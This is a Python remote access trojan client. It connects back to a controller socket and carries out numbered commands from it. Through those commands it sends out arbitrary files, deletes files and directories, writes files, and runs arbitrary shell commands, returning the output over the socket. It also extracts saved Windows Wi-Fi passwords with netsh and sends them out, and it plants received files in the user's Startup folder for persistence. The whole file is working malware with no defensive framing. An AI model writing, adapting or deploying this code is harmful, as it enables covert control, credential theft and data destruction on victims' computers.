import os
import shutil
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 8080
# host = input(str("enter server addr: "))
host = '127.0.0.1'

while True:
    try:
        try:
            s.connect((host, port))

            while 1:
                try:

                    command = s.recv(1040)
                    command = command.decode()
                    print("command recieved")
                    if command == "1":
                        files = os.getcwd()
                        files = str(files)
                        s.send(files.encode())
                        print("command executed* ")

                    elif command == "2":
                        userInput = s.recv(5000)
                        userInput = userInput.decode()
                        files = os.listdir(userInput)
                        files = str(files)
                        s.send(files.encode())
                        print("cus dir sent done* ")

                    elif command == "3":
                        filePath = s.recv(50000)
                        filePath.decode()
                        file = open(filePath, "rb")
                        data = file.read()
                        s.send(data)
                        print("File has been sent :) ")


                    elif command == "4":
                        # delete file
                        path = s.recv(50000).decode()
                        if os.path.exists("demofile.txt"):
                            os.remove(path)
                            s.send("Done*".encode())
                        else:
                            s.send("Failed*".encode())

                    elif command == "5":
                        # delete Dir
                        path = s.recv(50000).decode()
                        shutil.rmtree(path)
                        s.send("Done*".encode())

                    elif command == "6":
                        # make File
                        path = s.recv(50000).decode()
                        f = open(path, "w")

                        contant = s.recv(500000).decode()
                        f.write(str(contant))

                        s.send("Done*".encode())


                    elif command == "7":
                        string = os.system("ipconfig")
                        s.send("results of ipconfig******".encode())


                    elif command == "8":
                        tar = s.recv(50000).decode()  # taskkill /IM notepad.exe
                        try:
                            os.system(str(tar))
                            s.send("done :)".encode())
                        except:
                            s.send("bad command".encode())


                    elif command == "9":
                        # https://stackoverflow.com/a/40319875
                        os.system("echo Hello W0rld")



                    elif command == "10":
                        # https://nitratine.net/blog/post/get-wifi-passwords-with-python/

                        string = ""
                        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
                        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
                        for i in profiles:
                            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                                'utf-8').split('\n')
                            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                            try:
                                print("{:<30}|  {:<}".format(i, results[0]))
                            except IndexError:
                                print("{:<30}|  {:<}".format(i, ""))
                            string += results.pop()
                            string += "\n"

                        s.send(str(string).encode())
                    elif command == "11":
                        data = s.recv(50000).decode()
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                        output = proc.stdout.read() + proc.stderr.read()
                        s.send(output)

                    elif command == "12":
                        pass
                    elif command == "13":

                        file = s.recv(2000000000)
                        name = s.recv(500000).decode()
                        fileName = os.path.expanduser('~') + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/' + name
                        newFile = open(fileName, "wb")
                        receiving = newFile.write(file)

                        newFile.close()
                        print("Downloaded and saved")
                        s.send("done".encode())



                    print("")

                except ConnectionResetError:
                    print('failed to reset')
                    exit()
        except TimeoutError:
            print('timeout')

    except ConnectionRefusedError:
        print('failed to connect')
